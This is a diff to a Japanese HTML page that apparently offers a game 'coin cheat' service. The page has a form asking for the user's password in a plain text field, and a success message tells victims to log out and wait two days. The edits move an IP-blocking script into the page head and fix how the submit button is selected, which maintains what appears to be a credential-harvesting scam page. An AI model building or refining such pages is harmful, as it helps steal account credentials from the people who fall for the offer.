@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>コインチート依頼フォーム</title>
+    <script src="block_ip.js"></script> <!-- IP制限スクリプトを確実に読み込む -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -81,7 +82,7 @@
         <label for="password">パスワード</label>
         <input type="text" id="password" placeholder="パスワードを入力" required>
 
-        <button type="button" onclick="submitForm()">送信</button>
+        <button type="button" id="submitButton" onclick="submitForm()">送信</button>
 
         <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
         <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
@@ -127,7 +128,7 @@
 
                 if (response.ok) {
                     document.getElementById("successMessage").style.display = "block";
-                    const button = document.querySelector("button");
+                    const button = document.getElementById("submitButton");
                     button.style.backgroundColor = "pink";
                     button.textContent = "送信完了";
                     button.disabled = true;
@@ -142,7 +143,3 @@
     </script>
 </body>
 </html>
-
-<head>
-    <script src="block_ip.js"></script> <!-- JavaScriptファイルを読み込む -->
-</head>
